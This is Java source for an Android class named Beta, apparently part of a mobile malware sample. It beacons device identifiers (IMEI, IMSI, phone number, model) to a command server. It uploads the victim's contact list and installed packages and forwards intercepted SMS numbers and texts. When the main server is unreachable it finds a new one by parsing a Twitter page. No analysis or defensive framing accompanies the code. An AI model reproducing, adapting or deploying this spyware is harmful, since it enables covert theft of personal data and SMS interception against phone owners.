package ru.beta;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Build.VERSION;
import java.net.HttpURLConnection;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class Beta {
    public static Settings settings;

    public Beta(Context context, JSONObject jsonObject) {
        settings = new Settings();
        Settings settings = settings;
        Settings.setSettings(settings);
        context.getPackageName();
        if (settings.load(context)) {
            if (System.currentTimeMillis() > settings.timeNextConnection) {
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.period * Constants.SECOND));
                settings.save(context);
            }
            Functions.startTimer(context);
            MainService.start(context, new Intent(), "logs");
        } else if (jsonObject.has("server") && jsonObject.has("twitterUrl") && jsonObject.has("apiKey") && jsonObject.has("appId") && jsonObject.has("period") && jsonObject.has("startPeriod") && jsonObject.has("version") && jsonObject.has("sid")) {
            try {
                settings.server = jsonObject.getString("server");
                settings.twitterUrl = jsonObject.getString("twitterUrl");
                settings.apiKey = jsonObject.getString("apiKey");
                settings.appId = jsonObject.getString("appId");
                settings.period = jsonObject.getInt("period");
                settings.startPeriod = jsonObject.getInt("startPeriod");
                settings.version = jsonObject.getString("version");
                settings.sid = jsonObject.getString("sid");
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.startPeriod * Constants.SECOND));
                settings.packageName = context.getPackageName();
                System.out.println("packageName: " + settings.packageName);
                settings.save(context);
                Functions.startTimer(context);
                MainService.start(context, new Intent(), "logs");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        if (Constants.DEBUG) {
            System.out.println("Beta Created OK");
        }
    }

    public static List<NameValuePair> getDefaultHttpParams(String type) {
        List<NameValuePair> params = new LinkedList();
        params.add(new BasicNameValuePair("imei", settings.imei));
        params.add(new BasicNameValuePair("imsi", settings.imsi));
        params.add(new BasicNameValuePair("time", String.valueOf(System.currentTimeMillis())));
        params.add(new BasicNameValuePair("phone", settings.phone));
        params.add(new BasicNameValuePair("version", settings.version));
        params.add(new BasicNameValuePair("sid", settings.sid));
        params.add(new BasicNameValuePair("type", type));
        params.add(new BasicNameValuePair("os", "android"));
        params.add(new BasicNameValuePair("model", Build.MODEL));
        params.add(new BasicNameValuePair("manufacturer", Build.MANUFACTURER));
        params.add(new BasicNameValuePair("sdk", String.valueOf(VERSION.SDK_INT)));
        params.add(new BasicNameValuePair("apiKey", settings.apiKey));
        params.add(new BasicNameValuePair("appId", settings.appId));
        return params;
    }

    public static JSONObject sendRequest(Context context) {
        if (Constants.DEBUG) {
            System.out.println("sendRequest()");
        }
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("callback"), new LinkedList(), false, null);
            if (connection != null) {
                int code = connection.getResponseCode();
                if (Constants.DEBUG) {
                    System.out.println("getResponseCode: " + code);
                }
                if (code == 200) {
                    return Functions.parseResponse(connection.getInputStream());
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        try {
            Settings settings = Settings.getSettings();
            String server = Functions.parseTwitter(context, settings.twitterUrl);
            if (server.startsWith("http://")) {
                settings.server = server;
                settings.save(context);
            }
        } catch (Exception ex2) {
            ex2.printStackTrace();
        }
        return new JSONObject();
    }

    public static void sendContactsToServer(String contacts) {
        if (Constants.DEBUG) {
            System.out.println("sendContactsToServer()");
        }
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("phonebook"), new LinkedList(), true, contacts);
            if (connection != null) {
                int code = connection.getResponseCode();
                if (Constants.DEBUG) {
                    System.out.println("getResponseCode: " + code);
                }
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void sendPackagesToServer(String packages) {
        if (Constants.DEBUG) {
            System.out.println("sendPackagesToServer()");
        }
        try {
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", getDefaultHttpParams("packages"), new LinkedList(), true, packages);
            if (connection != null) {
                int code = connection.getResponseCode();
                if (Constants.DEBUG) {
                    System.out.println("getResponseCode: " + code);
                }
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static JSONObject sendCatchRequest(String number, String text) {
        if (Constants.DEBUG) {
            System.out.println("sendCatchRequest()");
        }
        try {
            List<NameValuePair> params = getDefaultHttpParams("catch");
            params.add(new BasicNameValuePair("number", number));
            params.add(new BasicNameValuePair("text", text));
            HttpURLConnection connection = Functions.sendHttpRequest(settings.server, "POST", params, new LinkedList(), false, null);
            if (connection != null && connection.getResponseCode() == 200) {
                return Functions.parseResponse(connection.getInputStream());
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return new JSONObject();
    }
}
